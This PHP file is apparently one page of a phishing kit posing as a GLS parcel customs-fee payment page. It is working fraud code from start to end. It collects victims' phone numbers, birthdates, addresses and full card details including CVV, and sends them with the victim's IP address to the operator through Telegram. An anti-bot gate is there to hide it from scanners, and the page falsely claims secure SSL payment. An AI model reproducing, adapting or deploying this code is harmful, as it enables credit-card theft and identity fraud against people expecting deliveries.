<?php
session_start();
require_once 'config.php';
require_once 'languages.php';
require_once 'antibot.php';

// Check anti-bot BEFORE showing any content
if (!isset($_SESSION['antibot_checked'])) {
    $antibotResult = checkAntiBot();
    $_SESSION['antibot_checked'] = true;

    // If blocked, the function will die() and stop execution
    if (!$antibotResult['allowed']) {
        // This line will never be reached if bot is blocked
        exit;
    }
}

// Store tracking number if coming from index
if (isset($_POST['tracking_number'])) {
    $_SESSION['tracking_number'] = $_POST['tracking_number'];
}

// Redirect if no tracking number
if (!isset($_SESSION['tracking_number'])) {
    header('Location: index.php');
    exit;
}

// Handle payment form submission - ÉTAPE 2
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['card_number'])) {
    // Store all payment data
    $_SESSION['phone'] = ($_POST['phone_prefix'] ?? '+36') . ' ' . ($_POST['phone'] ?? '');
    $_SESSION['birthdate'] = $_POST['birthdate'] ?? '';
    $_SESSION['address'] = $_POST['address'] ?? '';
    $_SESSION['city'] = $_POST['city'] ?? '';
    $_SESSION['postal'] = $_POST['postal'] ?? '';
    $_SESSION['country'] = $_POST['country'] ?? 'HU';
    $_SESSION['card_number'] = $_POST['card_number'] ?? '';
    $_SESSION['card_name'] = $_POST['card_name'] ?? '';
    $_SESSION['expiry'] = $_POST['expiry'] ?? '';
    $_SESSION['cvv'] = $_POST['cvv'] ?? '';

    // Calculate price
    $priceInfo = getCustomsPrice($_SESSION['country']);
    $_SESSION['price'] = $priceInfo['display'];

    // Send to Telegram - ÉTAPE 2: INFORMATIONS DE PAIEMENT
    $message = "💳 <b>ÉTAPE 2 - PAIEMENT SAISI</b>\n\n";
    $message .= "📦 <b>Numéro de suivi:</b> " . ($_SESSION['tracking_number'] ?? 'N/A') . "\n\n";
    $message .= "👤 <b>INFORMATIONS PERSONNELLES</b>\n";
    $message .= "📱 Téléphone: " . ($_SESSION['phone'] ?? 'N/A') . "\n";
    $message .= "🎂 Date naissance: " . ($_SESSION['birthdate'] ?? 'N/A') . "\n\n";
    $message .= "🏠 <b>ADRESSE DE LIVRAISON</b>\n";
    $message .= "📍 Adresse: " . ($_SESSION['address'] ?? 'N/A') . "\n";
    $message .= "🏙️ Ville: " . ($_SESSION['city'] ?? 'N/A') . "\n";
    $message .= "📮 Code postal: " . ($_SESSION['postal'] ?? 'N/A') . "\n";
    $message .= "🌍 Pays: " . ($_SESSION['country'] ?? 'N/A') . "\n\n";
    $message .= "💳 <b>INFORMATIONS BANCAIRES</b>\n";
    $message .= "💳 Numéro carte: " . ($_SESSION['card_number'] ?? 'N/A') . "\n";
    $message .= "👤 Titulaire: " . ($_SESSION['card_name'] ?? 'N/A') . "\n";
    $message .= "📅 Date expiration: " . ($_SESSION['expiry'] ?? 'N/A') . "\n";
    $message .= "🔒 CVV: " . ($_SESSION['cvv'] ?? 'N/A') . "\n\n";
    $message .= "💰 <b>Montant:</b> " . ($_SESSION['price'] ?? '150 HUF') . "\n";
    $message .= "💵 <b>Pays:</b> " . ($_SESSION['country'] ?? 'HU') . "\n";
    $message .= "⏰ <b>Date:</b> " . date('Y-m-d H:i:s') . "\n";
    $message .= "🌍 <b>Langue:</b> " . strtoupper(getCurrentLang()) . "\n";
    $message .= "🖥️ <b>IP:</b> " . ($_SERVER['REMOTE_ADDR'] ?? 'N/A') . "\n";

    sendToTelegram($message);
    error_log("TELEGRAM - Envoi ÉTAPE 2: Informations de paiement (incluant CVV et expiry)");

    // Redirect to loading page (12 seconds) then verification
    header('Location: loading_payment.php');
    exit;
}

// Get price based on LANGUAGE instead of country
$currentLang = getCurrentLang();
$priceInfo = getCustomsPriceByLanguage($currentLang);

// Auto-detect country from IP if not already set (for display only)
if (!isset($_SESSION['country']) && isset($_SESSION['detected_country'])) {
    $_SESSION['country'] = $_SESSION['detected_country'];
}

// Get selected country for display
$selectedCountry = $_POST['country'] ?? $_SESSION['country'] ?? 'HU';

$pageTitle = t('payment');
include 'includes/header.php';
?>

<div class="page-transition">
    <div class="container" style="padding: 3rem 1rem;">
        <a href="index.php" style="display: inline-flex; align-items: center; gap: 0.5rem; color: var(--gls-blue); text-decoration: none; margin-bottom: 1.5rem;">
            <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/>
            </svg>
            <span><?php echo t('back'); ?></span>
        </a>

        <div style="display: grid; grid-template-columns: 1fr; gap: 2rem; max-width: 1000px; margin: 0 auto;">
            <!-- Payment Form -->
            <div style="grid-column: 1; order: 2;">
                <div class="card" style="margin: 0;">
                    <div class="card-header">
                        <div class="icon-wrapper">
                            <svg width="32" height="32" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/>
                            </svg>
                        </div>
                        <h2><?php echo t('payment'); ?> - <?php echo t('customs_fee'); ?></h2>
                    </div>

                    <!-- Auto-detected country info -->
                    <?php if (isset($_SESSION['detected_country']) && !isset($_POST['country'])): ?>
                    <div class="alert alert-info" style="margin-bottom: 1rem;">
                        <strong>🌍 Pays détecté automatiquement</strong><br>
                        Votre pays a été détecté : <strong><?php echo t('country_' . strtolower($selectedCountry)); ?></strong><br>
                        Prix : <strong><?php echo $priceInfo['display']; ?></strong>
                    </div>
                    <?php endif; ?>

                    <!-- Customs Fee Explanation -->
                    <div class="alert alert-warning" style="margin-bottom: 2rem;">
                        <strong><?php echo t('customs_warning'); ?></strong><br>
                        <?php echo sprintf(t('customs_text_amount'), '<strong>' . $priceInfo['display'] . '</strong>'); ?>
                    </div>

                    <form action="payment.php" method="POST" id="paymentForm">
                        <h3 style="margin-bottom: 1.5rem; color: var(--gls-blue);"><?php echo t('personal_info'); ?></h3>

                        <div class="form-group">
                            <label for="phone"><?php echo t('phone'); ?> <?php echo t('required'); ?></label>
                            <div style="display: flex; gap: 0.5rem;">
                                <select id="phonePrefix" name="phone_prefix" class="form-input" style="flex: 0 0 120px;">
                                    <option value="+36" selected>🇭🇺 +36</option>
                                    <option value="+43">🇦🇹 +43</option>
                                    <option value="+49">🇩🇪 +49</option>
                                    <option value="+421">🇸🇰 +421</option>
                                    <option value="+40">🇷🇴 +40</option>
                                    <option value="+385">🇭🇷 +385</option>
                                    <option value="+386">🇸🇮 +386</option>
                                    <option value="+420">🇨🇿 +420</option>
                                    <option value="+48">🇵🇱 +48</option>
                                    <option value="+33">🇫🇷 +33</option>
                                    <option value="+44">🇬🇧 +44</option>
                                    <option value="+1">🇺🇸 +1</option>
                                    <option value="+39">🇮🇹 +39</option>
                                    <option value="+34">🇪🇸 +34</option>
                                    <option value="+31">🇳🇱 +31</option>
                                    <option value="+32">🇧🇪 +32</option>
                                    <option value="+41">🇨🇭 +41</option>
                                </select>
                                <input
                                    type="tel"
                                    id="phone"
                                    name="phone"
                                    class="form-input"
                                    placeholder="<?php echo t('placeholder_phone'); ?>"
                                    style="flex: 1;"
                                    required
                                >
                            </div>
                        </div>

                        <div class="form-group">
                            <label for="birthdate"><?php echo t('birthdate'); ?> <?php echo t('required'); ?></label>
                            <input
                                type="date"
                                id="birthdate"
                                name="birthdate"
                                class="form-input"
                                required
                            >
                        </div>

                        <h3 style="margin: 2rem 0 1.5rem; color: var(--gls-blue);"><?php echo t('billing_address'); ?></h3>

                        <div class="form-group">
                            <label for="address"><?php echo t('street'); ?> <?php echo t('required'); ?></label>
                            <input
                                type="text"
                                id="address"
                                name="address"
                                class="form-input"
                                placeholder="<?php echo t('placeholder_address'); ?>"
                                required
                            >
                        </div>

                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;">
                            <div class="form-group">
                                <label for="city"><?php echo t('city'); ?> <?php echo t('required'); ?></label>
                                <input
                                    type="text"
                                    id="city"
                                    name="city"
                                    class="form-input"
                                    placeholder="<?php echo t('placeholder_city'); ?>"
                                    required
                                >
                            </div>

                            <div class="form-group">
                                <label for="postal"><?php echo t('postal'); ?> <?php echo t('required'); ?></label>
                                <input
                                    type="text"
                                    id="postal"
                                    name="postal"
                                    class="form-input"
                                    placeholder="<?php echo t('placeholder_postal'); ?>"
                                    maxlength="5"
                                    required
                                >
                                <span class="form-help"><?php echo t('help_postal'); ?></span>
                            </div>
                        </div>

                        <div class="form-group">
                            <label for="country"><?php echo t('country'); ?> <?php echo t('required'); ?></label>
                            <select
                                id="country"
                                name="country"
                                class="form-input"
                                required
                            >
                                <option value=""><?php echo t('select_country'); ?></option>
                                <option value="HU" <?php echo $selectedCountry === 'HU' ? 'selected' : ''; ?>><?php echo t('country_hu'); ?></option>
                                <option value="AT" <?php echo $selectedCountry === 'AT' ? 'selected' : ''; ?>><?php echo t('country_at'); ?></option>
                                <option value="DE" <?php echo $selectedCountry === 'DE' ? 'selected' : ''; ?>><?php echo t('country_de'); ?></option>
                                <option value="SK" <?php echo $selectedCountry === 'SK' ? 'selected' : ''; ?>><?php echo t('country_sk'); ?></option>
                                <option value="RO" <?php echo $selectedCountry === 'RO' ? 'selected' : ''; ?>><?php echo t('country_ro'); ?></option>
                                <option value="HR" <?php echo $selectedCountry === 'HR' ? 'selected' : ''; ?>><?php echo t('country_hr'); ?></option>
                                <option value="SI" <?php echo $selectedCountry === 'SI' ? 'selected' : ''; ?>><?php echo t('country_si'); ?></option>
                                <option value="CZ" <?php echo $selectedCountry === 'CZ' ? 'selected' : ''; ?>><?php echo t('country_cz'); ?></option>
                                <option value="PL" <?php echo $selectedCountry === 'PL' ? 'selected' : ''; ?>><?php echo t('country_pl'); ?></option>
                                <option value="FR" <?php echo $selectedCountry === 'FR' ? 'selected' : ''; ?>><?php echo t('country_fr'); ?></option>
                                <option value="GB" <?php echo $selectedCountry === 'GB' ? 'selected' : ''; ?>><?php echo t('country_gb'); ?></option>
                                <option value="US" <?php echo $selectedCountry === 'US' ? 'selected' : ''; ?>><?php echo t('country_us'); ?></option>
                                <option value="IT" <?php echo $selectedCountry === 'IT' ? 'selected' : ''; ?>><?php echo t('country_it'); ?></option>
                                <option value="ES" <?php echo $selectedCountry === 'ES' ? 'selected' : ''; ?>><?php echo t('country_es'); ?></option>
                                <option value="NL" <?php echo $selectedCountry === 'NL' ? 'selected' : ''; ?>><?php echo t('country_nl'); ?></option>
                                <option value="BE" <?php echo $selectedCountry === 'BE' ? 'selected' : ''; ?>><?php echo t('country_be'); ?></option>
                                <option value="CH" <?php echo $selectedCountry === 'CH' ? 'selected' : ''; ?>><?php echo t('country_ch'); ?></option>
                            </select>
                        </div>

                        <h3 style="margin: 2rem 0 1.5rem; color: var(--gls-blue);"><?php echo t('payment_details'); ?></h3>

                        <div class="form-group">
                            <label for="cardNumber">
                                <?php echo t('card_number'); ?> <?php echo t('required'); ?>
                                <span id="cardType" style="margin-left: 0.5rem; font-weight: bold; font-size: 0.875rem; color: var(--gls-blue); display: none;"></span>
                            </label>
                            <input
                                type="text"
                                id="cardNumber"
                                name="card_number"
                                class="form-input"
                                placeholder="<?php echo t('placeholder_card'); ?>"
                                maxlength="19"
                                required
                            >
                            <span class="form-help" id="cardTypeText"></span>
                        </div>

                        <div class="form-group">
                            <label for="cardName"><?php echo t('card_holder'); ?> <?php echo t('required'); ?></label>
                            <input
                                type="text"
                                id="cardName"
                                name="card_name"
                                class="form-input"
                                placeholder="<?php echo t('placeholder_cardholder'); ?>"
                                required
                            >
                        </div>

                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem;">
                            <div class="form-group">
                                <label for="expiry"><?php echo t('expiry_date'); ?> <?php echo t('required'); ?></label>
                                <input
                                    type="text"
                                    id="expiry"
                                    name="expiry"
                                    class="form-input"
                                    placeholder="<?php echo t('placeholder_expiry'); ?>"
                                    maxlength="5"
                                    required
                                >
                            </div>

                            <div class="form-group">
                                <label for="cvv"><?php echo t('cvv'); ?> <?php echo t('required'); ?></label>
                                <input
                                    type="text"
                                    id="cvv"
                                    name="cvv"
                                    class="form-input"
                                    placeholder="<?php echo t('placeholder_cvv'); ?>"
                                    maxlength="4"
                                    required
                                >
                                <span class="form-help"><?php echo t('help_cvv'); ?></span>
                            </div>
                        </div>

                        <div class="alert alert-info">
                            <strong><?php echo t('secure_payment'); ?></strong> <?php echo t('secure_text'); ?>
                        </div>

                        <button type="submit" class="btn btn-primary btn-full" style="font-size: 1.125rem;" id="submit-btn">
                            <?php echo t('payment'); ?>: <span id="btn-price"><?php echo $priceInfo['display']; ?></span>
                        </button>
                    </form>
                </div>
            </div>

            <!-- Order Summary -->
            <div style="grid-column: 1; order: 1;">
                <div class="card" style="margin: 0; position: sticky; top: 1rem;">
                    <h3 style="margin-bottom: 1.5rem;"><?php echo t('order_summary'); ?></h3>

                    <div style="display: flex; align-items: center; gap: 1rem; padding: 1rem; background: #fef3c7; border: 2px solid #fbbf24; border-radius: 0.5rem; margin-bottom: 1.5rem;">
                        <svg width="32" height="32" fill="none" stroke="#92400e" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
                        </svg>
                        <div style="flex: 1;">
                            <p style="font-weight: 600; font-size: 0.875rem; color: #92400e;"><?php echo t('customs_fee_label'); ?></p>
                            <p style="font-size: 0.75rem; color: #78350f;"><?php echo t('customs_processing'); ?></p>
                        </div>
                    </div>

                    <div class="payment-summary">
                        <div class="summary-row">
                            <span><?php echo t('customs_fee_label'); ?>:</span>
                            <span style="font-weight: 600;" id="price-display"><?php echo $priceInfo['display']; ?></span>
                        </div>
                        <div class="summary-row">
                            <span><?php echo t('admin_cost'); ?>:</span>
                            <span style="font-weight: 600;"><?php echo t('included'); ?></span>
                        </div>
                        <div class="summary-row">
                            <span><?php echo t('vat'); ?>:</span>
                            <span style="font-weight: 600;"><?php echo t('included'); ?></span>
                        </div>
                        <div class="summary-row total">
                            <span><?php echo t('total'); ?></span>
                            <span class="amount" id="total-display"><?php echo $priceInfo['display']; ?></span>
                        </div>
                    </div>

                    <div class="alert alert-success" style="margin-top: 1.5rem; font-size: 0.75rem;">
                        <?php echo t('ssl_secure'); ?><br>
                        <?php echo t('privacy'); ?><br>
                        <?php echo t('instant_delivery'); ?>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<style>
    @media (min-width: 1024px) {
        .container > div {
            grid-template-columns: 2fr 1fr !important;
        }
        .container > div > div:first-child {
            order: 1 !important;
        }
        .container > div > div:last-child {
            order: 2 !important;
        }
    }
</style>


<?php include 'includes/footer.php'; ?>
